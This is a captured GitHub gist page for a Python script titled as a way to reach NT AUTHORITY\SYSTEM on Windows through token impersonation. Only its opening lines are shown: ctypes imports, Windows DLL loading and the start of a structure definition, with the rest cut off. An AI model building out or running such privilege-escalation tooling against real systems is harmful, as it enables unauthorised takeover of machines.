






<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://assets-cdn.github.com">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-DMUv06uA9jcLpuzWEnwuWTuYn/1rt3UmOKgIrS5ESQLJtqWQzexcD85XhWhAk0wcGQmlhspauIq+6Hjmue1A5g==" rel="stylesheet" href="https://assets-cdn.github.com/assets/frameworks-1291ffafdf7ffb4d9be67d690fd09212.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-T7Yq7rbiCzjLhP8CjEZRSSk/MBGeGhrW/1qjEVxq3LRxojFj+lZBb+irUNAsx12/UMTqKfO4++C5RoVNxAoJtQ==" rel="stylesheet" href="https://assets-cdn.github.com/assets/github-040328cdcb5f37143588d5b5e7893ba5.css" />
  
  
  <link crossorigin="anonymous" media="all" integrity="sha512-dqbqQpQAnHth7VQnoDdjrBCbRlABGaKWk7nKlbkYShXNLHveuOoKsuHG38HhMXSiGnEY7Tzi9UweDJnXOH2Arw==" rel="stylesheet" href="https://assets-cdn.github.com/assets/site-116638bcbb80e32c4c1618eeddcff5e3.css" />
  
  

  <meta name="viewport" content="width=device-width">
  
  <title> NT AUTHORITY\SYSTEM through Token Impersonation using Python · GitHub</title>
    <meta name="description" content=" NT AUTHORITY\SYSTEM through Token Impersonation using Python - popshellslikeitsasaturday.py">
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch-gist.xml" title="Gist">
  <link rel="fluid-icon" href="https://gist.github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    
    <meta property="og:image" content="https://avatars1.githubusercontent.com/u/1969988?s=400&amp;v=4" /><meta property="og:site_name" content="Gist" /><meta property="og:type" content="article" /><meta property="og:title" content=" NT AUTHORITY\SYSTEM through Token Impersonation using Python" /><meta property="og:url" content="https://gist.github.com/gavz/f7d6633f43954215f11f83689d44abb2" /><meta property="og:description" content=" NT AUTHORITY\SYSTEM through Token Impersonation using Python - popshellslikeitsasaturday.py" /><meta property="article:author" content="262588213843476" /><meta property="article:publisher" content="262588213843476" />

  <link rel="assets" href="https://assets-cdn.github.com/">
  
  <meta name="pjax-timeout" content="1000">
  
  <meta name="request-id" content="E31C:1BFD:7E3AA:E89F4:5BDA05C1" data-pjax-transient>


  

  <meta name="selected-link" value="gist_code" data-pjax-transient>

      <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
    <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
    <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

  <meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="gist" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" /><meta name="octolytics-dimension-request_id" content="E31C:1BFD:7E3AA:E89F4:5BDA05C1" /><meta name="octolytics-dimension-region_edge" content="iad" /><meta name="octolytics-dimension-region_render" content="iad" />
<meta name="analytics-location" content="/&lt;user-name&gt;/&lt;gist-id&gt;" data-pjax-transient="true" />



    <meta name="google-analytics" content="UA-3769691-4">


<meta class="js-ga-set" name="dimension1" content="Logged Out">



    <meta name="octolytics-dimension-public" content="true" /><meta name="octolytics-dimension-gist_id" content="92645111" /><meta name="octolytics-dimension-gist_name" content="f7d6633f43954215f11f83689d44abb2" /><meta name="octolytics-dimension-anonymous" content="false" /><meta name="octolytics-dimension-owner_id" content="1969988" /><meta name="octolytics-dimension-owner_login" content="gavz" /><meta name="octolytics-dimension-forked" content="true" /><meta name="octolytics-dimension-parent_gist_id" content="86417298" /><meta name="octolytics-dimension-parent_gist_name" content="147a16dd003b2fd1eacd9afcd1d0fe7f" /><meta name="octolytics-dimension-parent_anonymous" content="false" /><meta name="octolytics-dimension-parent_owner_id" content="17188216" /><meta name="octolytics-dimension-parent_owner_login" content="highsenburger69" />

  <meta class="js-ga-set" name="dimension5" content="public">
  <meta class="js-ga-set" name="dimension6" content="owned">
  <meta class="js-ga-set" name="dimension7" content="python">


      <meta name="hostname" content="gist.github.com">
    <meta name="user-login" content="">

      <meta name="expected-hostname" content="gist.github.com">
    <meta name="js-proxy-site-detection-payload" content="ZGI4OGRjZWNjYzc5NTg2NjdlZWZhNGRjNzY0Y2FjMmM1OTI2YmQzNjU3ZDhjOGYzN2Q4YTY3ODczNGU3MzllY3x7InJlbW90ZV9hZGRyZXNzIjoiODUuMTQ5LjEzMy4xMSIsInJlcXVlc3RfaWQiOiJFMzFDOjFCRkQ6N0UzQUE6RTg5RjQ6NUJEQTA1QzEiLCJ0aW1lc3RhbXAiOjE1NDEwMTQ5NzcsImhvc3QiOiJnaXRodWIuY29tIn0=">

    <meta name="enabled-features" content="DASHBOARD_V2_LAYOUT_OPT_IN,EXPLORE_DISCOVER_REPOSITORIES,UNIVERSE_BANNER,MARKETPLACE_PLAN_RESTRICTION_EDITOR">

  <meta name="html-safe-nonce" content="e34f9e7ab288955fcf52d7ca3003628b93635052">

  <meta http-equiv="x-pjax-version" content="daa2420e87dc2dd0263f1533051391a2">
  

      <link href="/gavz.atom" rel="alternate" title="atom" type="application/atom+xml">

  <link crossorigin="anonymous" media="all" integrity="sha512-276lVvjrO9uBs1FU7UaGaOySkNYW4LhdI4LPaMoFqvQjbhTqL3//QQFhhnMAJ/o/gChwAx2/qW9lirb4A85Gyw==" rel="stylesheet" href="https://assets-cdn.github.com/assets/gist-505186e2d729df6ac70c50c7e8754dbb.css" />




  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://assets-cdn.github.com/pinned-octocat.svg" color="#000000">
  <link rel="icon" type="image/x-icon" class="js-site-favicon" href="https://assets-cdn.github.com/favicon.ico">

<meta name="theme-color" content="#1e2327">




  </head>

  <body class="logged-out env-production">
    

  <div class="position-relative js-header-wrapper ">
    <a href="#start-of-content" tabindex="1" class="px-2 py-4 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
    <div id="js-pjax-loader-bar" class="pjax-loader-bar"><div class="progress"></div></div>

    
    
    



        <div class="Header gist-header header-logged-out" role="banner">
  <div class="container-lg px-3 clearfix">
    <div class="d-flex flex-justify-between">
      <div class="d-flex">
        <a class="header-logo-wordmark" data-hotkey="g d" aria-label="Gist Homepage" href="/">
          <svg width="78" height="28" class="octicon octicon-logo-github" viewBox="0 0 45 16" version="1.1" aria-hidden="true"><path fill-rule="evenodd" d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 0 0-.146-.18zm23.696-2.2c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 2c2.18 0 3.06.49 3.2.58.04.05.06.09.06.14L7.94 4.5c0 .09-.09.2-.2.17-.36-.11-.9-.33-2.17-.33-1.47 0-3.05.42-3.05 3.73s1.5 3.7 2.58 3.7c.92 0 1.25-.11 1.25-.11v-2.3H4.88c-.11 0-.19-.08-.19-.17V7.35c0-.09.08-.17.19-.17h3.74c.11 0 .19.08.19.17z"/></svg>
          <svg width="40" height="28" class="octicon octicon-logo-gist" viewBox="0 0 25 16" version="1.1" aria-hidden="true"><path fill-rule="evenodd" d="M4.7 8.73h2.45v4.02c-.55.27-1.64.34-2.53.34-2.56 0-3.47-2.2-3.47-5.05 0-2.85.91-5.06 3.48-5.06 1.28 0 2.06.23 3.28.73V2.66C7.27 2.33 6.25 2 4.63 2 1.13 2 0 4.69 0 8.03c0 3.34 1.11 6.03 4.63 6.03 1.64 0 2.81-.27 3.59-.64V7.73H4.7v1zm6.39 3.72V6.06h-1.05v6.28c0 1.25.58 1.72 1.72 1.72v-.89c-.48 0-.67-.16-.67-.7v-.02zm.25-8.72c0-.44-.33-.78-.78-.78s-.77.34-.77.78.33.78.77.78.78-.34.78-.78zm4.34 5.69c-1.5-.13-1.78-.48-1.78-1.17 0-.77.33-1.34 1.88-1.34 1.05 0 1.66.16 2.27.36v-.94c-.69-.3-1.52-.39-2.25-.39-2.2 0-2.92 1.2-2.92 2.31 0 1.08.47 1.88 2.73 2.08 1.55.13 1.77.63 1.77 1.34 0 .73-.44 1.42-2.06 1.42-1.11 0-1.86-.19-2.33-.36v.94c.5.2 1.58.39 2.33.39 2.38 0 3.14-1.2 3.14-2.41 0-1.28-.53-2.03-2.75-2.23h-.03zm8.58-2.47v-.86h-2.42v-2.5l-1.08.31v2.11l-1.56.44v.48h1.56v5c0 1.53 1.19 2.13 2.5 2.13.19 0 .52-.02.69-.05v-.89c-.19.03-.41.03-.61.03-.97 0-1.5-.39-1.5-1.34V6.94h2.42v.02-.01z"/></svg>
</a>
        <div class="site-search js-site-search" role="search">
            <div class="header-search" role="search">

<!-- '"` --><!-- </textarea></xmp> --></option></form><form class="position-relative js-quicksearch-form" action="/search" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="&#x2713;" />
  <label class="header-search-wrapper form-control js-chromeless-input-container">
    <input type="text"
      class="form-control js-site-search-focus header-search-input"
      data-hotkey="s,/"
      name="q"
      placeholder="Search…"
      autocorrect="off"
      autocomplete="off"
      autocapitalize="off">
  </label>

</form></div>

        </div>

        <ul class="list-style-none d-flex flex-items-center text-bold pl-2" role="navigation">
          <li><a class="HeaderNavlink px-2" data-ga-click="Header, go to all gists, text:all gists" href="/discover">All gists</a></li>
          <li><a class="HeaderNavlink px-2" data-ga-click="Header, go to GitHub, text:GitHub" href="https://github.com">GitHub</a></li>
        </ul>
      </div>

        <div class="header-actions" role="navigation">
            <a class="btn btn-primary" data-ga-click="Header, sign up" href="/join?source=header-gist">Sign up for a GitHub account</a>
          <a class="btn" data-ga-click="Header, sign in" href="https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fgavz%2Ff7d6633f43954215f11f83689d44abb2">Sign in</a>
        </div>
    </div>
  </div>
</div>



  </div>

  <div id="start-of-content" class="show-on-focus"></div>

    <div id="js-flash-container">


</div>



  <div role="main" class="application-main ">
        <div itemscope itemtype="http://schema.org/Code">
    <div id="gist-pjax-container" class="gist-content-wrapper" data-pjax-container>
      


  <div class="gist-detail-intro gist-banner">
    <div class="container">
      <p class="lead">
        Instantly share code, notes, and snippets.
      </p>
    </div>
  </div>


<div class="gisthead pagehead repohead instapaper_ignore readability-menu experiment-repo-nav mb-4">
  <div class="container">
    
  
<div class="container repohead-details-container">

  <ul class="pagehead-actions">


    <li>
        <a class="btn btn-sm btn-with-count tooltipped tooltipped-n" aria-label="You must be signed in to star a gist" rel="nofollow" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fgavz%2Ff7d6633f43954215f11f83689d44abb2">
    <svg class="octicon octicon-star" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14 6l-4.9-.64L7 1 4.9 5.36 0 6l3.6 3.26L2.67 14 7 11.67 11.33 14l-.93-4.74L14 6z"/></svg>
    Star
</a>
  <a class="social-count" aria-label="0 users starred this gist" href="/gavz/f7d6633f43954215f11f83689d44abb2/stargazers">
    0
</a>
    </li>

      <li>
          <a class="btn btn-sm btn-with-count tooltipped tooltipped-n" aria-label="You must be signed in to fork a gist" rel="nofollow" href="/login?return_to=https%3A%2F%2Fgist.github.com%2Fgavz%2Ff7d6633f43954215f11f83689d44abb2">
    <svg class="octicon octicon-repo-forked" viewBox="0 0 10 16" version="1.1" width="10" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8 1a1.993 1.993 0 0 0-1 3.72V6L5 8 3 6V4.72A1.993 1.993 0 0 0 2 1a1.993 1.993 0 0 0-1 3.72V6.5l3 3v1.78A1.993 1.993 0 0 0 5 15a1.993 1.993 0 0 0 1-3.72V9.5l3-3V4.72A1.993 1.993 0 0 0 8 1zM2 4.2C1.34 4.2.8 3.65.8 3c0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3 10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2zm3-10c-.66 0-1.2-.55-1.2-1.2 0-.65.55-1.2 1.2-1.2.65 0 1.2.55 1.2 1.2 0 .65-.55 1.2-1.2 1.2z"/></svg>
    Fork
</a>
  <a class="social-count" aria-label="0 users forked this gist" href="/gavz/f7d6633f43954215f11f83689d44abb2/forks">
    0
</a>
      </li>
  </ul>

  <h1 class="public css-truncate">
    <img class="avatar gist-avatar" src="https://avatars1.githubusercontent.com/u/1969988?s=52&amp;v=4" width="26" height="26" alt="@gavz" />
    <span class="author"><a rel="author" class="url fn" href="/gavz"><span itemprop="author">gavz</span></a></span><!--
        --><span class="path-divider">/</span><!--
        --><strong itemprop="name" class="gist-header-title css-truncate-target"><a href="/gavz/f7d6633f43954215f11f83689d44abb2">popshellslikeitsasaturday.py</a></strong>

      <span class="fork-flag">
        <span class="text">forked from <a href="/highsenburger69/147a16dd003b2fd1eacd9afcd1d0fe7f">highsenburger69/popshellslikeitsasaturday.py</a></span>
      </span>
    <div class="d-block text-small text-gray">
      Created <time-ago datetime="2018-10-24T23:05:51Z">Oct 24, 2018</time-ago>
    </div>
  </h1>
</div>

<div class="container gist-file-navigation">
  <div class="float-right file-navigation-options" data-multiple>

    <div class="file-navigation-option v-align-middle">

  <div class="input-group js-gist-share-menu">
    <div class="input-group-button">
      <details class="details-reset details-overlay select-menu">
        <summary class="btn btn-sm select-menu-button" data-ga-click="Repository, clone Embed, location:repo overview">
          <span data-menu-button>Embed</span>
        </summary>
        <details-menu class="select-menu-modal position-absolute" style="z-index: 99;" aria-label="Clone options">
          <div class="select-menu-header">
            <span class="select-menu-title">What would you like to do?</span>
          </div>
          <div class="select-menu-list">
              <button type="button"
                  class="select-menu-item width-full"
                  aria-checked="true"
                  role="menuitemradio"
                  tabindex="0"
                  value="&lt;script src=&quot;https://gist.github.com/gavz/f7d6633f43954215f11f83689d44abb2.js&quot;&gt;&lt;/script&gt;">
                <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"/></svg>
                <div class="select-menu-item-text">
                  <span class="select-menu-item-heading" data-menu-button-text>
                    
                    Embed
                  </span>
                    <span class="description">
                      Embed this gist in your website.
                    </span>
                </div>
              </button>
              <button type="button"
                  class="select-menu-item width-full"
                  aria-checked="false"
                  role="menuitemradio"
                  tabindex="0"
                  value="https://gist.github.com/gavz/f7d6633f43954215f11f83689d44abb2">
                <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"/></svg>
                <div class="select-menu-item-text">
                  <span class="select-menu-item-heading" data-menu-button-text>
                    
                    Share
                  </span>
                    <span class="description">
                      Copy sharable link for this gist.
                    </span>
                </div>
              </button>
              <button type="button"
                  class="select-menu-item width-full"
                  aria-checked="false"
                  role="menuitemradio"
                  tabindex="0"
                  value="https://gist.github.com/f7d6633f43954215f11f83689d44abb2.git">
                <svg class="octicon octicon-check select-menu-item-icon" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M12 5l-8 8-4-4 1.5-1.5L4 10l6.5-6.5L12 5z"/></svg>
                <div class="select-menu-item-text">
                  <span class="select-menu-item-heading" data-menu-button-text>
                    Clone via
                    HTTPS
                  </span>
                    <span class="description">
                      Clone with Git or checkout with SVN using the repository’s web address.
                    </span>
                </div>
              </button>
          </div>
          <div class="select-menu-list" role="menu">
            <a class="select-menu-item select-menu-action" href="https://help.github.com/articles/which-remote-url-should-i-use" target="_blank">
              <svg class="octicon octicon-question select-menu-item-icon" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M6 10h2v2H6v-2zm4-3.5C10 8.64 8 9 8 9H6c0-.55.45-1 1-1h.5c.28 0 .5-.22.5-.5v-1c0-.28-.22-.5-.5-.5h-1c-.28 0-.5.22-.5.5V7H4c0-1.5 1.5-3 3-3s3 1 3 2.5zM7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7z"/></svg>
              <div class="select-menu-item-text">
                Learn more about clone URLs
              </div>
            </a>
          </div>
        </details-menu>
      </details>
    </div>

    <input
      id="gist-share-url"
      type="text"
      data-autoselect
      class="form-control input-monospace input-sm"
      value="&lt;script src=&quot;https://gist.github.com/gavz/f7d6633f43954215f11f83689d44abb2.js&quot;&gt;&lt;/script&gt;"
      aria-label="Clone this repository at &lt;script src=&quot;https://gist.github.com/gavz/f7d6633f43954215f11f83689d44abb2.js&quot;&gt;&lt;/script&gt;"
      readonly>

    <div class="input-group-button">
      <clipboard-copy for="gist-share-url" aria-label="Copy to clipboard" class="btn btn-sm zeroclipboard-button">
        <svg class="octicon octicon-clippy" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M2 13h4v1H2v-1zm5-6H2v1h5V7zm2 3V8l-3 3 3 3v-2h5v-2H9zM4.5 9H2v1h2.5V9zM2 12h2.5v-1H2v1zm9 1h1v2c-.02.28-.11.52-.3.7-.19.18-.42.28-.7.3H1c-.55 0-1-.45-1-1V4c0-.55.45-1 1-1h3c0-1.11.89-2 2-2 1.11 0 2 .89 2 2h3c.55 0 1 .45 1 1v5h-1V6H1v9h10v-2zM2 5h8c0-.55-.45-1-1-1H8c-.55 0-1-.45-1-1s-.45-1-1-1-1 .45-1 1-.45 1-1 1H3c-.55 0-1 .45-1 1z"/></svg>
      </clipboard-copy>
    </div>
  </div>
</div>


    <div class="file-navigation-option">
</div>


    <div class="file-navigation-option">
      <a href="/gavz/f7d6633f43954215f11f83689d44abb2/archive/81143a70200270cc37fa640262603c6e0734d934.zip"
          class="btn btn-sm"
          rel="nofollow"
          data-ga-click="Gist, download zip, location:gist overview">
        Download ZIP
      </a>
    </div>
  </div>

  <div class="float-left">
    <nav class="reponav js-repo-nav js-sidenav-container-pjax"
     role="navigation"
     data-pjax="#gist-pjax-container">

  <a class="js-selected-navigation-item selected reponav-item" aria-label="Code" data-pjax="true" data-hotkey="g c" data-selected-links="gist_code /gavz/f7d6633f43954215f11f83689d44abb2" href="/gavz/f7d6633f43954215f11f83689d44abb2">
    <svg class="octicon octicon-code" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M9.5 3L8 4.5 11.5 8 8 11.5 9.5 13 14 8 9.5 3zm-5 0L0 8l4.5 5L6 11.5 2.5 8 6 4.5 4.5 3z"/></svg>
    Code
</a>
    <a class="js-selected-navigation-item reponav-item" aria-label="Revisions" data-pjax="true" data-hotkey="g r" data-selected-links="gist_revisions /gavz/f7d6633f43954215f11f83689d44abb2/revisions" href="/gavz/f7d6633f43954215f11f83689d44abb2/revisions">
      <svg class="octicon octicon-git-commit" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M10.86 7c-.45-1.72-2-3-3.86-3-1.86 0-3.41 1.28-3.86 3H0v2h3.14c.45 1.72 2 3 3.86 3 1.86 0 3.41-1.28 3.86-3H14V7h-3.14zM7 10.2c-1.22 0-2.2-.98-2.2-2.2 0-1.22.98-2.2 2.2-2.2 1.22 0 2.2.98 2.2 2.2 0 1.22-.98 2.2-2.2 2.2z"/></svg>
      Revisions
      <span class="Counter">4</span>
</a>

</nav>

  </div>
</div>


  </div>
</div>

<div class="container new-discussion-timeline experiment-repo-nav">
  <div class="repository-content gist-content">
    
  <div>
      <div itemprop="about">
     NT AUTHORITY\SYSTEM through Token Impersonation using Python
  </div>


        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-popshellslikeitsasaturday-py" class="file">
      <div class="file-header">
        <div class="file-actions">

          <a class="btn btn-sm " href="/gavz/f7d6633f43954215f11f83689d44abb2/raw/81143a70200270cc37fa640262603c6e0734d934/popshellslikeitsasaturday.py">Raw</a>
        </div>
        <div class="file-info">
          <span class="icon">
            <svg class="octicon octicon-gist" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.5 5L10 7.5 7.5 10l-.75-.75L8.5 7.5 6.75 5.75 7.5 5zm-3 0L2 7.5 4.5 10l.75-.75L3.5 7.5l1.75-1.75L4.5 5zM0 13V2c0-.55.45-1 1-1h10c.55 0 1 .45 1 1v11c0 .55-.45 1-1 1H1c-.55 0-1-.45-1-1zm1 0h10V2H1v11z"/></svg>
          </span>
          <a class="tooltipped tooltipped-s css-truncate" aria-label="Permalink" href="#file-popshellslikeitsasaturday-py">
            <strong class="user-select-contain gist-blob-name css-truncate-target">
              popshellslikeitsasaturday.py
            </strong>
          </a>
        </div>
      </div>
    

  <div itemprop="text" class="blob-wrapper data type-python ">
      <table class="highlight tab-size js-file-line-container" data-tab-size="8">
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L1" class="blob-num js-line-number" data-line-number="1"></td>
        <td id="file-popshellslikeitsasaturday-py-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> -*- coding: UTF-8 -*-</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L2" class="blob-num js-line-number" data-line-number="2"></td>
        <td id="file-popshellslikeitsasaturday-py-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> All credits go to: https://github.com/joren485/PyWinPrivEsc/blob/master/RunAsSystem.py</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L3" class="blob-num js-line-number" data-line-number="3"></td>
        <td id="file-popshellslikeitsasaturday-py-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">from</span> ctypes.wintypes <span class="pl-k">import</span> <span class="pl-k">*</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L4" class="blob-num js-line-number" data-line-number="4"></td>
        <td id="file-popshellslikeitsasaturday-py-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">from</span> ctypes <span class="pl-k">import</span> <span class="pl-k">*</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L5" class="blob-num js-line-number" data-line-number="5"></td>
        <td id="file-popshellslikeitsasaturday-py-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">from</span> enum <span class="pl-k">import</span> IntEnum</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L6" class="blob-num js-line-number" data-line-number="6"></td>
        <td id="file-popshellslikeitsasaturday-py-LC6" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L7" class="blob-num js-line-number" data-line-number="7"></td>
        <td id="file-popshellslikeitsasaturday-py-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> These libraries have the APIs we need</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L8" class="blob-num js-line-number" data-line-number="8"></td>
        <td id="file-popshellslikeitsasaturday-py-LC8" class="blob-code blob-code-inner js-file-line">kernel32 <span class="pl-k">=</span> WinDLL(<span class="pl-s"><span class="pl-pds">&#39;</span>kernel32<span class="pl-pds">&#39;</span></span>,  <span class="pl-v">use_last_error</span><span class="pl-k">=</span><span class="pl-c1">True</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L9" class="blob-num js-line-number" data-line-number="9"></td>
        <td id="file-popshellslikeitsasaturday-py-LC9" class="blob-code blob-code-inner js-file-line">advapi32 <span class="pl-k">=</span> WinDLL(<span class="pl-s"><span class="pl-pds">&#39;</span>advapi32<span class="pl-pds">&#39;</span></span>,  <span class="pl-v">use_last_error</span><span class="pl-k">=</span><span class="pl-c1">True</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L10" class="blob-num js-line-number" data-line-number="10"></td>
        <td id="file-popshellslikeitsasaturday-py-LC10" class="blob-code blob-code-inner js-file-line">psapi    <span class="pl-k">=</span> WinDLL(<span class="pl-s"><span class="pl-pds">&#39;</span>psapi.dll<span class="pl-pds">&#39;</span></span>, <span class="pl-v">use_last_error</span><span class="pl-k">=</span><span class="pl-c1">True</span>)</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L11" class="blob-num js-line-number" data-line-number="11"></td>
        <td id="file-popshellslikeitsasaturday-py-LC11" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L12" class="blob-num js-line-number" data-line-number="12"></td>
        <td id="file-popshellslikeitsasaturday-py-LC12" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> Define structures</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L13" class="blob-num js-line-number" data-line-number="13"></td>
        <td id="file-popshellslikeitsasaturday-py-LC13" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://docs.python.org/2/library/ctypes.html#structures-and-unions</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L14" class="blob-num js-line-number" data-line-number="14"></td>
        <td id="file-popshellslikeitsasaturday-py-LC14" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">PSID</span> <span class="pl-k">=</span> c_void_p</td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L15" class="blob-num js-line-number" data-line-number="15"></td>
        <td id="file-popshellslikeitsasaturday-py-LC15" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">#</span> The SID_AND_ATTRIBUTES structure represents a security identifier (SID) and its attributes. SIDs are used to uniquely identify users or groups</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L16" class="blob-num js-line-number" data-line-number="16"></td>
        <td id="file-popshellslikeitsasaturday-py-LC16" class="blob-code blob-code-inner js-file-line">                                                                <span class="pl-c"><span class="pl-c">#</span> https://msdn.microsoft.com/en-us/library/windows/desktop/aa379595(v=vs.85).aspx</span></td>
      </tr>
      <tr>
        <td id="file-popshellslikeitsasaturday-py-L17" class="blob-num js-line-number" data-line-number="17"></td>
        <td id="file-popshellslikeitsasaturday-py-LC17" class="blob-code blob-code-inner js-file-line"><span class="pl-k">class</span> <span class="pl-en">SID_AND_ATTRIBUTES</span>(<span class="pl-e">Structure</span>):                           <span class="pl-c"><span class="pl-c">#</span> typedef struct _SID_AND_ATTRIBUTES</span></td>
      </tr>
      <tr>
